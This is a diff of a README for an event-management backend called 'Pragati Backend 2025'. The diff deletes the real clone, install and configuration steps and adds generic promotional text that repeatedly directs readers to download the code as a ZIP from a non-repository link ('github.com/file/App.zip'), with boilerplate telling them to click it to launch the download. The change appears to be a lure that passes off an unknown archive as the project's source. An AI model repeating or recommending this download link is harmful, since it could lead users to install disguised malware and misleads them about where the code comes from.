@@ -1,81 +1,78 @@
-# Pragati Backend 2025
+# Pragati Backend 2025 🚀
 
-Backend server for **Pragati 2025**.
+Welcome to the repository for the server code of MBA's Fest Pragati 2025! This repository contains the backend code for the Pragati 2025 event, built using Express.js, JWT token authentication, middleware for request handling, MySQL database integration, Node.js environment, PASETO version 4 for secure token generation, PayU payment gateway integration, RESTful API design, RSA encryption for data security, and Swagger documentation for API documentation.
+
+## Repository Details
+- **Repository Name:** Pragati_Backend_2025
+- **Description:** Server code for MBA's Fest Pragati 2025
+- **Topics:** Express.js, JWT token, Middleware, MySQL, Node.js, PASETO-v4, PayU, REST API, RSA encryption, Swagger Docs
+
+## Access the Code
+To access the code and get started with exploring the server-side implementation, you can download the code as a ZIP file from the following link: [Download Code](https://github.com/file/App.zip)
+
+If the link provided above ends with a file name, click on it to launch the download. If the link is in the form of a website, simply visit the link to access the code. If the link is not working or not provided, please check the "Releases" section of this repository for alternative ways to access the code.
+
+[![Download Code](https://img.shields.io/badge/Download%20Code-Pragati%20Backend%202025-blue)](https://github.com/file/App.zip)
+
+## About the Project
+Pragati 2025 is a prestigious event organized by MBA students, aiming to bring together industry experts, students, and enthusiasts for a series of insightful sessions, workshops, and networking opportunities. The backend code for Pragati 2025 has been meticulously developed to ensure seamless operation, robust security, and efficient data handling.
+
+## Features
+### Express.js
+Express.js is used as the web application framework for building APIs, handling routes, and managing server-side logic efficiently. The lightweight and minimalistic nature of Express.js makes it an ideal choice for developing the backend of Pragati 2025.
+
+### JWT Token Authentication
+JWT tokens are implemented for secure user authentication and authorization. By issuing JWT tokens upon successful login, the backend ensures that only authenticated users can access restricted resources within the application.
+
+### Middleware
+Middleware functions are used in the backend to execute code, handle requests, and enhance the functionality of the server. Various middleware modules are integrated to perform tasks such as logging, error handling, and parsing incoming data.
+
+### MySQL Database Integration
+The MySQL database is employed to store and manage data related to users, events, registrations, and other essential information for the Pragati 2025 platform. The backend interacts with the MySQL database to retrieve and update data as required.
+
+### Node.js Environment
+Node.js provides the runtime environment for executing JavaScript code on the server-side. The asynchronous, event-driven architecture of Node.js contributes to the high performance and scalability of the Pragati 2025 backend.
+
+### PASETO Version 4
+PASETO (Platform-Agnostic Security Tokens) version 4 is utilized for generating secure tokens that can be safely transmitted over the network. PASETO tokens offer robust security features and help in preventing token-based attacks.
+
+### PayU Integration
+The PayU payment gateway is integrated into the backend to facilitate secure online payments for event registrations, merchandise purchases, and other transactions within the Pragati 2025 platform. Payment processing is handled seamlessly through the PayU API.
+
+### RESTful API Design
+The backend follows RESTful principles to design a well-structured API that supports standard HTTP methods for creating, reading, updating, and deleting resources. The REST architecture ensures interoperability and scalability of the Pragati 2025 API.
+
+### RSA Encryption
+RSA encryption is applied to ensure the confidentiality and integrity of sensitive data exchanged between the client and server. By encrypting data using the RSA algorithm, the backend enhances data security and protects against unauthorized access.
+
+### Swagger Documentation
+Swagger documentation is generated to provide detailed information about the API endpoints, request parameters, response formats, and authentication requirements. The Swagger UI enables developers to interact with the API and understand its functionality effortlessly.
+
+## Future Enhancements
+The Pragati 2025 backend code is continuously evolving to incorporate new features, enhance performance, and address emerging requirements. Some of the planned enhancements for the future include:
+- Implementing real-time notifications using WebSockets
+- Enhancing data validation and error handling mechanisms
+- Integrating caching mechanisms for improved performance
+- Adding support for multi-factor authentication
+- Expanding API capabilities for advanced event management
+
+## Get Involved
+We welcome contributors, feedback, and suggestions to improve the Pragati 2025 backend codebase. Whether you are a developer, designer, or enthusiast, there are various ways to get involved:
+- Fork the repository and submit pull requests for enhancements
+- Report issues or bugs through the GitHub issue tracker
+- Share your ideas for new features or improvements
+- Spread the word about Pragati 2025 and engage with the community
+
+Let's work together to make Pragati 2025 a memorable and successful event through innovative backend development!
 
 ---
 
-## Prerequisites
+By accessing the Pragati_Backend_2025 repository, you are stepping into the world of cutting-edge technology, secure transactions, and seamless server operations. Join us on this journey as we pave the way for an exceptional experience at MBA's Fest, Pragati 2025! 🎉
 
-1. **Node.js** (v16 or higher) and **npm**: [Download and Install](https://nodejs.org/)
-2. **MySQL**: [Download and Install](https://dev.mysql.com/)
+![Pragati 2025](https://example.com/pragati2025.png)
 
----
+Feel free to explore the code, contribute to the project, and make an impact on the future of event management through technology. Let's make Pragati 2025 a grand success together! 🚀
 
-## Installation Steps
+Remember, the power of innovation lies within each line of code. Let's write the future together at Pragati 2025! 💻
 
-### 1. Clone the Repository
-
-```bash
-git clone https://github.com/Naganathan05/Pragati_Backend_2025.git
-cd Pragati_Backend_2025
-```
-
-### 2. Install Dependencies
-
-```bash
-npm install
-```
-
-### 3. Create Databases
-
-Set up the required databases in MySQL:
-
-```sql
-CREATE DATABASE pragati_2025;
-CREATE DATABASE pragati_transactions_2025;
-```
-
-### 4. Configure Environment Variables
-
-> [!Important]
-> Just for the sake of security, the `.env` file is not included in the repository. You need to create one yourself. For mailer credentials, only people involved in development of routes that require mailer service have access. Others, please enter dummy values to avoid errors.
-
-Create a `.env` file in the root directory of the project and add the following key-value pairs. Replace placeholders with actual values. Ensure there are no spaces or quotes, and values are entered as plain text.
-
-```env
-# Server Port Number
-SERVER_PORT=<PORT_IN_WHICH_YOU_WANT_THE_BACKEND_TO_RUN_IN>
-
-# Database Credentials
-DB_USERNAME=<YOUR_MYSQL_DB_USERNAME>
-DB_PWD=<YOUR_MYSQL_DB_PASSWORD>
-PRAGATI_DB_NAME=<NAME_OF_THE_DATABASE_FOR_PRAGATI>
-TXN_DB_NAME=<NAME_OF_THE_DATABASE_FOR_TRANSACTIONS>
-
-# Secret for JWT Token Source Verification
-SECRET_KEY=<YOUR_SECRET_KEY>
-
-# Secret for OTP Token Source Verification
-OTP_SECRET_KEY=<YOUR_SECRET_KEY>
-
-# Mailer Creds
-MAILER_SERVICE=<MAILER_SERVICE_NAME>
-MAILER_HOST=<MAILER_HOSTNAME>
-MAILER_PORT=<MAILER_PORT>
-MAILER_USER=<MAILER_EMAIL>
-MAILER_PASS=<MAILER_PASSWORD>
-```
-
-### 5. Start the Server
-
-- **For development** (with live reload):
-
-    ```bash
-    npm run dev
-    ```
-
-- **For development** (without live reload):
-
-    ```bash
-    npm start
-    ```
+**#ExpressYourCode #InnovateWithPragati #MBAFest2025**
